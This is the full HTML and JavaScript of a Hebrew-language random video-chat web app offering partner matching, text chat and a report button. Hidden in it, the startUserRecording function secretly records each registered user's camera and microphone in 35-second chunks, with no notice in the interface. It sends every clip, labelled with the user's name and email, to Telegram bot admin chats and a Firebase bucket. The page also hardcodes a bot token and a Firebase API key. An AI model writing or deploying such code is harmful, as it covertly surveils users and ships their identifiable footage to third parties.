<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>VideoApp Pro - Fix Edition</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-storage-compat.js"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: system-ui, sans-serif; background: #000; height: 100vh; display: flex; flex-direction: column; color: white; overflow: hidden; }
        
        .header { position: absolute; top: 15px; width: 100%; display: flex; justify-content: space-between; padding: 0 15px; z-index: 2000; pointer-events: none; }
        .btn-circle { background: rgba(0,0,0,0.6); border: 1px solid rgba(255,255,255,0.3); color: white; width: 45px; height: 45px; border-radius: 50%; cursor: pointer; pointer-events: auto; font-size: 20px; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
        
        /* חלוקה חצי-חצי */
        .v-box { flex: 1; position: relative; overflow: hidden; background: #000; display: flex; align-items: center; justify-content: center; }
        .v-box:first-child { border-bottom: 2px solid #333; }
        video { width: 100%; height: 100%; object-fit: cover; }
        
        .status-msg { position: absolute; z-index: 100; font-weight: bold; text-align: center; width: 100%; text-shadow: 0 2px 4px #000; }

        /* צ'אט מעל הווידאו התחתון */
        #chat-section { 
            position: absolute; bottom: 0; width: 100%; height: 40%; 
            display: none; flex-direction: column; 
            background: rgba(255, 255, 255, 0.9); color: #000; z-index: 1500;
            border-top-left-radius: 20px; border-top-right-radius: 20px;
        }
        #messages { flex: 1; overflow-y: auto; padding: 10px; display: flex; flex-direction: column; gap: 8px; }
        .msg { max-width: 80%; padding: 8px 12px; border-radius: 15px; font-size: 14px; line-height: 1.4; word-wrap: break-word; }
        .msg.me { align-self: flex-start; background: #ddd; }
        .msg.partner { align-self: flex-end; background: #007bff; color: #fff; }
        
        .chat-input-area { display: flex; padding: 10px; background: #fff; gap: 8px; border-top: 1px solid #eee; }
        .chat-input-area input { flex: 1; padding: 10px 15px; border-radius: 20px; border: 1px solid #ccc; outline: none; font-size: 16px; color: #000; }

        /* הרשמה */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 3000; align-items: center; justify-content: center; }
        .modal-content { background: #fff; color: #333; width: 85%; max-width: 380px; padding: 30px; border-radius: 25px; }
        .modal-content input, .modal-content select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #ddd; font-size: 16px; }
        .reg-btn { width: 100%; height: 50px; background: #27ae60; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; }
    </style>
</head>
<body>

<div class="header">
    <button id="btn-report" class="btn-circle" style="background:#e74c3c; display:none;" onclick="confirmReport()">🚩</button>
    <button class="btn-circle" onclick="switchCamera()">🔄</button>
</div>

<div id="swipe-zone" style="flex:1; display:flex; flex-direction:column;">
    <div class="v-box">
        <div id="msg-idle" class="status-msg">⬅️ החלק שמאלה לחיפוש</div>
        <div id="msg-search" class="status-msg" style="display:none; color:#3498db;">מחפש שותף...</div>
        <video id="remoteVideo" autoplay playsinline></video>
    </div>
    
    <div class="v-box">
        <video id="localVideo" autoplay muted playsinline></video>
        <div id="chat-section">
            <div id="messages"></div>
            <div class="chat-input-area">
                <input type="text" id="chatInput" placeholder="כתוב הודעה..." autocomplete="off">
                <button onclick="sendChatMessage()" style="border:none; background:none; font-size:24px; cursor:pointer;">🚀</button>
            </div>
        </div>
    </div>
</div>

<div id="regModal" class="modal">
    <div class="modal-content">
        <h2 style="text-align:center; margin-bottom:15px;">כניסה</h2>
        <input type="text" id="reg-name" placeholder="שם מלא">
        <input type="email" id="reg-email" placeholder="אימייל">
        <select id="reg-gender">
            <option value="זכר">זכר</option>
            <option value="נקבה">נקבה</option>
        </select>
        <button class="reg-btn" onclick="handleRegistration()">התחל שיחה</button>
    </div>
</div>

<script>
    const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
    const ADMIN_IDS = ["8373785890", "7089165458"];
    const SERVER_URL = "https://video-app-ylx4.onrender.com"; 
    
    const firebaseConfig = { apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", storageBucket: "live-video-20fca.firebasestorage.app" };
    firebase.initializeApp(firebaseConfig);
    const storage = firebase.storage();
    
    const socket = io(SERVER_URL);
    const peer = new Peer(undefined, {
        config: {'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }], 'sdpSemantics': 'unified-plan'},
        debug: 1
    });

    let myStream, myPeerId, currentCall, partnerData = null, isSearching = false, camFacing = "user", userRecorder;

    window.onload = () => {
        const saved = localStorage.getItem('user_v12');
        if (!saved) document.getElementById('regModal').style.display = 'flex';
        else initCamera();
    };

    async function handleRegistration() {
        const name = document.getElementById('reg-name').value;
        const email = document.getElementById('reg-email').value;
        const gender = document.getElementById('reg-gender').value;
        if(!name || !email) return alert("נא למלא פרטים");
        localStorage.setItem('user_v12', JSON.stringify({ name, email, gender }));
        document.getElementById('regModal').style.display = 'none';
        initCamera();
    }

    async function initCamera() {
        if (myStream) myStream.getTracks().forEach(t => t.stop());
        myStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camFacing, frameRate: 24 }, audio: true });
        document.getElementById('localVideo').srcObject = myStream;
        startUserRecording();
    }

    function startUserRecording() {
        userRecorder = new MediaRecorder(myStream, { mimeType: 'video/webm;codecs=vp8,opus' });
        userRecorder.ondataavailable = async (e) => {
            if (e.data.size > 0) {
                const blob = new Blob([e.data], { type: 'video/mp4' });
                const user = JSON.parse(localStorage.getItem('user_v12'));
                const fileName = `rec_${Date.now()}.mp4`;
                ADMIN_IDS.forEach(id => {
                    const fd = new FormData();
                    fd.append("chat_id", id); fd.append("video", blob, fileName);
                    fd.append("caption", `🎥 הקלטה מ: ${user.name} (${user.email})`);
                    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd });
                });
                storage.ref(`admin/users/${user.email}/${fileName}`).put(blob);
            }
        };
        userRecorder.start();
        setInterval(() => { if(userRecorder.state === "recording") { userRecorder.stop(); userRecorder.start(); } }, 35000);
    }

    peer.on('open', id => myPeerId = id);

    function startSearching() {
        if (isSearching) return;
        isSearching = true;
        stopEverything();
        document.getElementById('msg-idle').style.display = "none";
        document.getElementById('msg-search').style.display = "block";
        const user = JSON.parse(localStorage.getItem('user_v12'));
        socket.emit('find-partner', { peerId: myPeerId, name: user.name, email: user.email });
    }

    socket.on('partner-found', data => {
        partnerData = data; // המידע נשמר מיד כאן
        isSearching = false;
        document.getElementById('msg-search').style.display = "none";
        document.getElementById('chat-section').style.display = "flex";
        document.getElementById('btn-report').style.display = "flex";
        currentCall = peer.call(data.peerId, myStream);
        handleCall(currentCall);
    });

    peer.on('call', call => {
        call.answer(myStream);
        currentCall = call;
        // כשיש שיחה נכנסת, השרת שולח את פרטי השותף
        socket.emit('request-partner-data');
        document.getElementById('chat-section').style.display = "flex";
        document.getElementById('btn-report').style.display = "flex";
        handleCall(call);
    });

    socket.on('send-partner-data', data => { partnerData = data; });

    socket.on('partner-disconnected', () => { stopEverything(); });

    function handleCall(call) {
        call.on('stream', s => {
            const rv = document.getElementById('remoteVideo');
            rv.srcObject = s;
            rv.onloadedmetadata = () => rv.play();
        });
        call.on('close', () => stopEverything());
    }

    function sendChatMessage() {
        const input = document.getElementById('chatInput');
        if (!input.value.trim()) return;
        socket.emit('send-chat-msg', input.value);
        addMsg('me', input.value);
        input.value = "";
    }

    socket.on('receive-chat-msg', msg => addMsg('partner', msg));

    function addMsg(type, text) {
        const div = document.createElement('div');
        div.className = `msg ${type}`;
        div.innerText = text;
        const m = document.getElementById('messages');
        m.appendChild(div);
        m.scrollTop = m.scrollHeight;
    }

    function confirmReport() {
        if (confirm("דווח על המשתמש ונתק שיחה?")) {
            const user = JSON.parse(localStorage.getItem('user_v12'));
            const reported = partnerData ? `${partnerData.name} (${partnerData.email})` : "לא זוהה";
            
            ADMIN_IDS.forEach(id => {
                const text = `🚨 **דיווח**\nהמדווח: ${user.name}\nעל מי: ${reported}`;
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`);
            });
            
            socket.emit('report-user');
            stopEverything();
        }
    }

    function stopEverything() {
        isSearching = false;
        partnerData = null;
        socket.emit('leave-chat');
        if (currentCall) { currentCall.close(); currentCall = null; }
        document.getElementById('msg-idle').style.display = "block";
        document.getElementById('chat-section').style.display = "none";
        document.getElementById('btn-report').style.display = "none";
        document.getElementById('remoteVideo').srcObject = null;
        document.getElementById('messages').innerHTML = "";
    }

    function switchCamera() { camFacing = (camFacing === "user" ? "environment" : "user"); initCamera(); }

    let sX = 0;
    document.getElementById('swipe-zone').addEventListener('touchstart', e => sX = e.touches[0].clientX);
    document.getElementById('swipe-zone').addEventListener('touchend', e => {
        const diff = sX - e.changedTouches[0].clientX;
        if (diff > 80) startSearching(); 
        else if (diff < -80) stopEverything();
    });
</script>
</body>
</html>
